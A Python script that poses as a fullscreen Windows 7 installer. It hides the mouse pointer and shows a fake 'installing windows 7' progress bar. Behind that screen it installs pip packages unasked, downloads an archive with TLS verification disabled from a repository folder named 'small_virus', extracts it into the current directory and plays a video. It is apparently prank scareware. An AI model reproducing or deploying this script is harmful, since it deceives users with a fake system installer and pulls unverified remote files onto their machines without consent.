import os
os.system('cls')
print('checking dependencies...')
os.system('python -m pip install requests tqdm pygame ffpyplayer')
import pygame
import requests
import zipfile
import sys
import threading
from ffpyplayer.player import MediaPlayer

def download_file(url, output_path, progress_callback=None):
    response = requests.get(url, stream=True, verify=False)
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024  # 1 Kibibyte

    with open(output_path, 'wb') as file:
        downloaded_size = 0
        for data in response.iter_content(block_size):
            file.write(data)
            downloaded_size += len(data)
            if progress_callback:
                progress_callback(downloaded_size, total_size)

def extract_zip(file_path, extract_to='.'):
    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def play_video(video_path):
    pygame.display.quit()  # 关闭当前的 pygame 显示
    pygame.display.init()  # 重新初始化显示
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    player = MediaPlayer(video_path)
    clock = pygame.time.Clock()

    while True:
        frame, val = player.get_frame()
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                player.close_player()
                return
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    player.close_player()
                    return

        if val != 'eof' and frame is not None:
            image, pts = frame
            img = pygame.image.frombuffer(image.to_bytearray()[0], image.get_size(), "RGB")
            screen.blit(img, (0, 0))
            pygame.display.flip()

        clock.tick(60)

def main():
    pygame.init()

    # 设置全屏模式
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    screen_width, screen_height = screen.get_size()

    # 隐藏鼠标指针
    pygame.mouse.set_visible(False)

    # 设置背景颜色
    background_color = (30, 30, 30)  # 深灰色
    screen.fill(background_color)

    # 设置字体
    font = pygame.font.SysFont('Arial', 36)
    small_font = pygame.font.SysFont('Arial', 24)

    # 计算进度条的位置和大小
    progress_bar_width = screen_width * 0.6
    progress_bar_height = 50
    progress_bar_x = (screen_width - progress_bar_width) / 2
    progress_bar_y = screen_height * 0.8

    # 下载文件
    url = 'https://github.com/huluobuo/filesss-huluobuo/raw/refs/heads/main/small_virus/Windows_7_Song_of_Death/update.zip'
    output_path = 'update.zip'

    progress = 0

    def update_progress(downloaded, total_size):
        nonlocal progress
        if total_size > 0:
            progress = downloaded / total_size * 100

    def download_thread():
        nonlocal download_complete
        try:
            download_file(url, output_path, update_progress)
            download_complete = True
        except Exception as e:
            print(f"Error during download: {e}")
            download_complete = False

    # 启动下载线程
    download_complete = False
    threading.Thread(target=download_thread).start()

    # 加载本地图像
    image_path = 'windows7.png'
    if not os.path.exists(image_path):
        image_url = 'https://raw.githubusercontent.com/huluobuo/filesss-huluobuo/refs/heads/main/small_virus/Windows_7_Song_of_Death/windows7.png'
        download_file(image_url, image_path)

    image = pygame.image.load(image_path)

    # 缩小图像
    scale_factor = 0.5  # 缩小比例
    image = pygame.transform.scale(image, (int(image.get_width() * scale_factor), int(image.get_height() * scale_factor)))
    image_rect = image.get_rect(center=(screen_width / 2, screen_height * 0.3))

    # 隐藏光标
    pygame.mouse.set_visible(False)

    # 主循环
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False

        # 绘制背景
        screen.fill(background_color)

        # 绘制图像
        screen.blit(image, image_rect)

        # 绘制进度条背景
        pygame.draw.rect(screen, (50, 50, 50), (progress_bar_x, progress_bar_y, progress_bar_width, progress_bar_height))

        # 绘制进度条前景
        pygame.draw.rect(screen, (0, 120, 215), (progress_bar_x, progress_bar_y, progress_bar_width * (progress / 100), progress_bar_height))

        # 绘制进度文本
        if progress < 100:
            progress_text = font.render(f'installing windows 7 - {int(progress)}%', True, (255, 255, 255))
        else:
            progress_text = font.render('done - will start installer, please wait', True, (255, 255, 255))
        text_rect = progress_text.get_rect(center=(screen_width / 2, progress_bar_y + progress_bar_height / 2 + 75))
        screen.blit(progress_text, text_rect)

        # 绘制更新文本
        update_text = small_font.render("windows installer   V1.2 pro", True, (255, 255, 255))
        update_text_rect = update_text.get_rect(center=(screen_width / 2, screen_height * 0.7))
        screen.blit(update_text, update_text_rect)

        # 绘制提示文本
        tip_text = small_font.render("(C) 2025 huluobuo - Don't close the computer", True, (255, 255, 255))
        tip_text_rect = tip_text.get_rect(center=(screen_width / 2, screen_height * 0.75))
        screen.blit(tip_text, tip_text_rect)

        # 更新显示
        pygame.display.flip()

        # 控制帧率
        pygame.time.Clock().tick(60)

    if download_complete:
        print("Extracting file...")
        extract_zip(output_path)
        os.remove(output_path)
        print("Done.")

        # 播放视频
        video_path = 'win7.mp4'
        if os.path.exists(video_path):
            play_video(video_path)
        else:
            print(f"Video file {video_path} not found.")

    pygame.quit()
    sys.exit()

if __name__ == "__main__":
    main()
